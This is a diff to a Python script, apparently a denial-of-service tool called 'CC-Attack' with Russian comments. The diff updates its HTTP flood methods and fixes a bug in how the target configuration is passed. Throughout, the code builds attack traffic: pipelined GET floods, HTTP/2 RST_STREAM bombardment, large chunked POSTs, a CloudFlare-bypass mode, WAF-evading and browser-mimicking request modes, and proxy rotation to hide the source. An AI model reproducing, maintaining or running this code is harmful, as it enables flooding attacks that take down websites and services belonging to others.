@@ -1,7 +1,7 @@
 #!/usr/bin/python3
 # -*- coding: utf-8 -*-
 """
-CC-Attack v5.3.0 — Mega+ Edition
+CC-Attack v5.3.1 — Mega+ Edition (fixed KeyError target)
 Author: DIDO
 Requires: pip install requests pysocks
 """
@@ -72,7 +72,7 @@ class C:
         YEL = GRN = CYN = BLU = PRP = WHT = ""
 
 
-VERSION = "5.3.0"
+VERSION = "5.3.1"
 BUILD   = "2026/09/27"
 
 # ── Автодетект Termux ───────────────────────────────────────────────────────
@@ -110,13 +110,7 @@ HTTP_METHODS = [
 SPECIAL_METHODS = [
     "OVH", "RAPIDREST",
     "CFB", "SLOWPOST", "BURST", "HTTP3",
-    # 🆕 Мега-методы
-    "GOD",       # 20 склеенных запросов
-    "POWER",     # HTTP/2 RST_STREAM бомбардировка
-    "NUCLEAR",   # POST 100 KB + chunked
-    "LASER",     # 60-байтные микро-GET
-    "SHOTGUN",   # Мультиплекс 5 методов
-    "STEALTH",   # Реалистичный браузерный запрос
+    "GOD", "POWER", "NUCLEAR", "LASER", "SHOTGUN", "STEALTH",
 ]
 ALL_METHODS = HTTP_METHODS + SPECIAL_METHODS + ["RANDOM"]
 
@@ -148,19 +142,32 @@ class AsyncLog:
     _queue: "queue.Queue[str]" = queue.Queue(maxsize=100000)
     _thread: threading.Thread | None = None
     _stop = threading.Event()
+    _enabled: bool = True
 
     @classmethod
     def start(cls):
+        if not cls._enabled:
+            return
         if cls._thread is None:
             cls._thread = threading.Thread(target=cls._writer, daemon=True)
             cls._thread.start()
+
+    @classmethod
+    def shutdown(cls):
+        """Останавливает логгер перед выходом, чтобы не было блокировки stdout."""
+        cls._stop.set()
+        if cls._thread is not None:
+            try:
+                cls._thread.join(timeout=1.0)
+            except Exception:
+                pass
 
     @classmethod
     def _writer(cls):
         q = cls._queue
         while not cls._stop.is_set():
             try:
-                msg = q.get(timeout=0.5)
+                msg = q.get(timeout=0.2)
             except queue.Empty:
                 continue
             try:
@@ -171,6 +178,13 @@ class AsyncLog:
 
     @classmethod
     def put(cls, msg: str):
+        if not cls._enabled:
+            try:
+                sys.stdout.write(msg)
+                sys.stdout.flush()
+            except Exception:
+                pass
+            return
         try:
             cls._queue.put_nowait(msg)
         except queue.Full:
@@ -426,16 +440,8 @@ class CCHandler:
             f"Connection: close\r\n\r\n"
         ).encode()
 
-    # ═══ 🆕 УСИЛЕННЫЙ RAPIDREST ═══════════════════════════════════════
+    # ═══ RAPIDREST ════════════════════════════════════════════════════
     def _build_rapidrest(self) -> bytes:
-        """
-        Усиленный RAPIDREST:
-          - application/octet-stream (быстрее парсится)
-          - Accept-Encoding: identity (сервер не сжимает)
-          - Cache-Control: no-store (без кэша)
-          - Connection: keep-alive (переиспользование сокета)
-          - Случайное бинарное тело
-        """
         body = os.urandom(32)
         return (
             f"POST {self.path} HTTP/1.1\r\n"
@@ -448,7 +454,7 @@ class CCHandler:
             f"Connection: keep-alive\r\n\r\n"
         ).encode() + body
 
-    # ═══ CFB — CloudFlare Bypass ══════════════════════════════════════
+    # ═══ CFB ══════════════════════════════════════════════════════════
     def _build_cfb(self) -> bytes:
         ua = get_ua()
         sec = random.choice(SEC_FETCH_HEADERS)
@@ -502,12 +508,8 @@ class CCHandler:
             f"Connection: Keep-Alive\r\n\r\n"
         ).encode()
 
-    # ═══ 🆕 GOD — 20 склеенных запросов ═══════════════════════════════
+    # ═══ GOD ══════════════════════════════════════════════════════════
     def _build_god(self) -> bytes:
-        """
-        GOD-метод: 20 минимальных GET в одном syscall.
-        Плюс минимум заголовков — 45 байт на запрос.
-        """
         rng = self.rng
         parts = []
         target = self.target
@@ -519,30 +521,22 @@ class CCHandler:
             )
         return "".join(parts).encode()
 
-    # ═══ 🆕 POWER — HTTP/2 RST_STREAM бомбардировка ═══════════════════
+    # ═══ POWER ════════════════════════════════════════════════════════
     def _build_power(self) -> bytes:
-        """
-        POWER: HTTP/2 preface + 50 RST_STREAM фреймов.
-        Заставляет сервер обрабатывать фреймы закрытия потоков.
-        """
         preface = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
         settings = struct.pack(">BHB", 0, 0, 0x04) + struct.pack(">BHB", 0, 0, 0x00)
         parts = [preface, settings]
-        for stream_id in range(1, 100, 2):  # нечётные = клиентские
+        for stream_id in range(1, 100, 2):
             rst = (struct.pack(">BHB", 0, 4, 0x03) +
                    struct.pack(">I", stream_id) +
-                   struct.pack(">I", 0x08))  # CANCEL
+                   struct.pack(">I", 0x08))
             parts.append(rst)
         return b"".join(parts)
 
-    # ═══ 🆕 NUCLEAR — POST 100 KB + chunked ═══════════════════════════
+    # ═══ NUCLEAR ══════════════════════════════════════════════════════
     def _build_nuclear(self) -> bytes:
-        """
-        NUCLEAR: огромный POST с 100 KB тела.
-        Сервер вынужден принимать и обрабатывать много данных.
-        """
         chunk_size = 8192
-        total_chunks = 12  # 12 × 8192 ≈ 96 KB
+        total_chunks = 12
         parts = [
             f"POST {self.path} HTTP/1.1\r\n"
             f"Host: {self.target}\r\n"
@@ -559,24 +553,16 @@ class CCHandler:
         parts.append("0\r\n\r\n")
         return "".join(parts).encode("latin-1")
 
-    # ═══ 🆕 LASER — 60-байтные микро-GET ═════════════════════════════
+    # ═══ LASER ════════════════════════════════════════════════════════
     def _build_laser(self) -> bytes:
-        """
-        LASER: минимальный GET (~50 байт).
-        Максимум RPS на единицу трафика.
-        """
         rng = self.rng
         return (
             f"GET /{rng.next() % 9999} HTTP/1.1\r\n"
             f"Host:{self.target}\r\n\r\n"
         ).encode()
 
-    # ═══ 🆕 SHOTGUN — мультиплекс 5 методов ═══════════════════════════
+    # ═══ SHOTGUN ══════════════════════════════════════════════════════
     def _build_shotgun(self) -> bytes:
-        """
-        SHOTGUN: 5 разных методов в одном syscall.
-        Сложнее фильтруется WAF.
-        """
         rng = self.rng
         t = self.target
         p = self.path
@@ -590,12 +576,8 @@ class CCHandler:
         ]
         return "".join(parts).encode()
 
-    # ═══ 🆕 STEALTH — реалистичный браузерный запрос ══════════════════
+    # ═══ STEALTH ══════════════════════════════════════════════════════
     def _build_stealth(self) -> bytes:
-        """
-        STEALTH: полный набор заголовков реального браузера.
-        Сложно отличить от обычного пользователя.
-        """
         ua = get_ua()
         sec = random.choice(SEC_FETCH_HEADERS)
         ref = f"https://{self.target}/"
@@ -613,7 +595,7 @@ class CCHandler:
             f"Referer: {ref}\r\n\r\n"
         ).encode()
 
-    # ═══ HTTP/2 upgrade ═══════════════════════════════════════════════
+    # ═══ HTTP/2 ═══════════════════════════════════════════════════════
     def _build_http2_upgrade(self) -> bytes:
         ua = get_ua()
         return (
@@ -646,81 +628,49 @@ class CCHandler:
             f"Sec-WebSocket-Version: 13\r\n\r\n"
         ).encode()
 
-    # ═══ ОДИН ЗАПРОС с учётом метода и техники ═══════════════════════
+    # ═══ ОДИН ЗАПРОС ══════════════════════════════════════════════════
     def _build_one(self) -> bytes:
         m = self._resolve_method()
         tech = self.technique
 
-        # базовые методы
-        if m == "OVH":
-            return self._build_ovh()
-        if m == "RAPIDREST":
-            return self._build_rapidrest()
-        if m == "CFB":
-            return self._build_cfb()
-        if m == "SLOWPOST":
-            return self._build_slowpost()
-        if m == "BURST":
-            return self._build_burst()
-        if m == "HTTP3":
-            return self._build_http3()
+        if m == "OVH": return self._build_ovh()
+        if m == "RAPIDREST": return self._build_rapidrest()
+        if m == "CFB": return self._build_cfb()
+        if m == "SLOWPOST": return self._build_slowpost()
+        if m == "BURST": return self._build_burst()
+        if m == "HTTP3": return self._build_http3()
+        if m == "GOD": return self._build_god()
+        if m == "POWER": return self._build_power()
+        if m == "NUCLEAR": return self._build_nuclear()
+        if m == "LASER": return self._build_laser()
+        if m == "SHOTGUN": return self._build_shotgun()
+        if m == "STEALTH": return self._build_stealth()
 
-        # 🆕 мега-методы
-        if m == "GOD":
-            return self._build_god()
-        if m == "POWER":
-            return self._build_power()
-        if m == "NUCLEAR":
-            return self._build_nuclear()
-        if m == "LASER":
-            return self._build_laser()
-        if m == "SHOTGUN":
-            return self._build_shotgun()
-        if m == "STEALTH":
-            return self._build_stealth()
-
-        # техники
         if tech == "http2":
-            if random.random() < 0.5:
-                return self._build_http2_pk()
+            if random.random() < 0.5: return self._build_http2_pk()
             return self._build_http2_upgrade()
-        if tech == "websocket":
-            return self._build_websocket()
+        if tech == "websocket": return self._build_websocket()
         if tech == "carpet":
             choice = random.random()
-            if choice < 0.4:
-                return self._build_basic("GET")
-            elif choice < 0.7:
-                return self._build_http2_upgrade()
-            else:
-                return self._build_websocket()
+            if choice < 0.4: return self._build_basic("GET")
+            elif choice < 0.7: return self._build_http2_upgrade()
+            else: return self._build_websocket()
         if tech == "bypass":
             m2 = random.choice(ALL_METHODS[:-1])
-            if m2 in ("OVH", "CFB", "HTTP3"):
-                return self._build_cfb()
-            if m2 == "SLOWPOST":
-                return self._build_slowpost()
-            if m2 == "BURST":
-                return self._build_burst()
-            if m2 == "RAPIDREST":
-                return self._build_rapidrest()
-            if m2 == "GOD":
-                return self._build_god()
-            if m2 == "POWER":
-                return self._build_power()
-            if m2 == "NUCLEAR":
-                return self._build_nuclear()
-            if m2 == "LASER":
-                return self._build_laser()
-            if m2 == "SHOTGUN":
-                return self._build_shotgun()
-            if m2 == "STEALTH":
-                return self._build_stealth()
+            if m2 in ("OVH", "CFB", "HTTP3"): return self._build_cfb()
+            if m2 == "SLOWPOST": return self._build_slowpost()
+            if m2 == "BURST": return self._build_burst()
+            if m2 == "RAPIDREST": return self._build_rapidrest()
+            if m2 == "GOD": return self._build_god()
+            if m2 == "POWER": return self._build_power()
+            if m2 == "NUCLEAR": return self._build_nuclear()
+            if m2 == "LASER": return self._build_laser()
+            if m2 == "SHOTGUN": return self._build_shotgun()
+            if m2 == "STEALTH": return self._build_stealth()
             return self._build_basic(m2)
 
         return self._build_basic(m)
 
-    # ═══ Пачка (pipeline) ═════════════════════════════════════════════
     def _build_batch(self, n: int) -> bytes:
         parts = []
         for _ in range(n):
@@ -1034,6 +984,7 @@ def _run_threaded(cfg, proxies, cpu_count):
 
     stop_event = threading.Event()
 
+    # ── 🆕 FIX: cfg теперь содержит target/path/port/protocol/proxy_type ──
     handler = CCHandler(
         target=cfg["target"], path=cfg["path"],
         port=cfg["port"], protocol=cfg["protocol"],
@@ -1324,7 +1275,7 @@ def check_proxies(proxies, proxy_type, ms=3, workers=800,
 
 
 # ─────────────────────────────────────────────────────────────────────────────
-#  RUN_ATTACK
+#  RUN_ATTACK — 🆕 FIX: обновляем cfg всеми полями
 # ─────────────────────────────────────────────────────────────────────────────
 def run_attack(cfg):
     url = cfg["url"]
@@ -1345,6 +1296,19 @@ def run_attack(cfg):
         target, port = hostport, (443 if protocol == "https" else 80)
 
     proxy_type = {"4": 4, "5": 5, "http": 0}[cfg["proxy_ver"]]
+
+    # ── 🆕 FIX: пишем разобранные поля обратно в cfg ──
+    cfg["target"] = target
+    cfg["path"] = path
+    cfg["port"] = port
+    cfg["protocol"] = protocol
+    cfg["proxy_type"] = proxy_type
+    cfg.setdefault("cookies", "")
+    cfg.setdefault("post_data", "")
+    cfg.setdefault("brute", False)
+    cfg.setdefault("method", "GET")
+    cfg.setdefault("technique", "flood")
+
     out_file = Path(cfg["out_file"])
 
     if cfg["down"] or not out_file.exists():
@@ -1547,7 +1511,8 @@ def interactive_cli():
     return run_attack(cfg)
 
 
-# ─────────────────────────────────────────────────────────────────────────────#  MAIN
+# ─────────────────────────────────────────────────────────────────────────────
+#  MAIN
 # ─────────────────────────────────────────────────────────────────────────────
 def main() -> int:
     if len(sys.argv) > 1:
@@ -1610,7 +1575,10 @@ def main() -> int:
 if __name__ == "__main__":
     try:
         mp.freeze_support()
-        sys.exit(main())
+        rc = main()
+        AsyncLog.shutdown()
+        sys.exit(rc)
     except KeyboardInterrupt:
         print("\nInterrupted by user.")
+        AsyncLog.shutdown()
         sys.exit(130)
